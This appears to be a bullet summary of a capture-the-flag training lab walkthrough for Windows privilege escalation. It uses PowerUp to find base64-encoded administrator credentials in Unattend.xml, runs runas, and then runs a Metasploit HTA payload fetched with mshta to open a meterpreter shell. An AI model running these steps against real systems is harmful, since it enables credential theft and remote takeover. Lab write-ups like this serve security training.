

Here are the summary steps from the document in bullet points:

1. Step 1: Begin by switching to the attacker machine for locating a privilege escalation vulnerability.
    
2. Step 2: Open a PowerShell terminal to check the current user. It is revealed that you are running as a student user and provided with the PowerSploit framework and PowerUp.ps1 scripts.
    
3. Step 3: Run the PowerUp.ps1 PowerShell script to find privilege escalation vulnerabilities.
    
    - Commands:
        - Open PowerShell: `Powershell.exe`
        - Navigate to the PowerUp directory: `cd .\Desktop\PowerSploit\Privesc\`
        - List the files: `ls`
4. Step 4: Import PowerUp.ps1 script and invoke the Invoke-PrivescAudit function.
    
    - Commands:
        - Set PowerShell execution policy to bypass: `powershell -ep bypass`
        - Import PowerUp.ps1: `. .\PowerUp.ps1`
        - Invoke PrivescAudit function: `Invoke-PrivescAudit`
        - Notice the presence of an Unattend.xml file and open it.
5. Step 5: Read the Unattend.xml file to discover encoded administrator credentials.
    
    - Command: `cat C:\Windows\Panther\Unattend.xml`
6. Step 6: Decode the administrator password using PowerShell.
    
    - Commands:
        - Set password variable: `$password='QWRtaW5AMTIz'`
        - Decode the password: `$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))`
        - Display the decoded password: `echo $password`
7. Step 7: Run a command prompt as an administrator user using discovered credentials.
    
    - Commands: `runas.exe /user:administrator cmd`
        - Enter the decoded password: `Admin@123`
        - Check the current user with `whoami`.
8. Step 8: Switch to the Kali machine to run the hta_server module and gain a meterpreter shell.
    
    - Commands:
        - Start Metasploit: `msfconsole -q`
        - Use the hta_server exploit module: `use exploit/windows/misc/hta_server`
        - Exploit and copy the generated payload, e.g., "[http://10.10.0.2:8080/6Nz7aySfPN.hta](http://10.10.0.2:8080/6Nz7aySfPN.hta)."
        - Run the payload on the target's cmd.exe with the `mshta` command.
9. Step 9: On the target machine, run the meterpreter shell payload using `mshta.exe`.
    
    - Command:
        - Replace the HTA server link with your own: `mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta`
10. Step 10: Find and access the flag using the meterpreter shell.
    
    - Commands:
        - Connect to the meterpreter session: `sessions -i 1`
        - Navigate to the Desktop: `cd C:\\Users\\Administrator\\Desktop`
        - List the directory contents: `dir`
        - Display the flag content: `cat flag.txt`
11. You have successfully revealed the flag.
    
    - Flag: `097ab83639dce0ab3429cb0349493f60`


https://assets.ine.com/labs/ad-manuals/walkthrough-2106.pdf